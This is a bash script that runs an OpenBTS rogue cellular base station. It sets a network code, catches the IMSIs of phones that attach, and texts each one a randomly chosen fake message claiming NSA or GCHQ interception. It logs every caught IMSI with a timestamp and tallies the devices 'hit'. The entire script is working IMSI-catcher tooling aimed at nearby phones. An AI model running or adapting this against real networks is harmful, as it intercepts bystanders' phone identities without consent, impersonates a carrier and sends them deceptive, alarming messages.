#!/bin/bash
# log file location and name
LOG=$HOME/openbts/$(date +%Y-%m-%d_%H:%M:%S)_tmsis.log

KEY=''

    # figlet -f slant "Starting up..."
    echo "Starting up..."
    echo "Press 'Q' for a clean exit"
    echo "//---------------------------------------------------------------->"

    #MNCs=$(source MNCS.txt)
    MNCs=(06 06)
    TXTS=(
    "State Spying Reform 2014-A6. Embrace Our Transparency."
    "NSA Thanks You For Use Of Your Device"
    "This Device Has Cooperated. We Thank It."
    "Intercepted For Future Use. GCHQ Thanks You."
    "Trans Atlantic Upload Complete."
    "Remain Still. Do Not Switch Off Device - GCHQ"
    )


    while [ "x$KEY" != "xQ" ];
        do 
            read KEY 
            for i in ${MNCs[@]}; 
                do 
                    MNC=$i; 
                    # Set the BTS to the new MNC 
                    echo "config GSM.Identity.MNC $MNC" | ./OpenBTSCLI
                    echo "We're working with MNC: " $MNC
                    # Poll every 60 seconds 
                    for j in {1..60}:
                        do 
                            sleep 1
                            # Check if we've caught any IMSIs
                            if [ $(echo "tmsis"|./OpenBTSCLI|tail -n +15|awk '{print $2 }'|sed '/^\s*$/d'|wc -l) -gt 0 ]
                                then
                                    for IMSI in $(echo "tmsis"|./OpenBTSCLI | tail -n +15 | awk '{ print $2 }' | sed '/^\s*$/d');
                                        do
                                            # Randomly choose an SMS to send them
                                            SMS="${TXTS[RANDOM%${#TXTS[@]}]}"
                                            # Send it
                                            echo "sendsms $IMSI $SMS"|./OpenBTSCLI
                                            echo IMSI $IMSI was sent $SMS 
                                            # Append this event to log
                                            echo $IMSI $(date +%Y-%m-%d_%H-%M-%S) $MNC $SMS >> $LOG
                                            #sleep 1
                                        done
                                    # Clear the TMSIS table
                                    echo "tmsis clear" | ./OpenBTSCLI
                                else
                                    echo "No IMSI joined us this round."
                            fi
                        done
                done
    done

    echo "//<----------------------------------------------------------------"
    echo "Quitting..."

    cat $LOG | sort -n | uniq -u > $LOG.sorted
    echo "We hit" $(cat $LOG.sorted | wc -l) "devices this session."

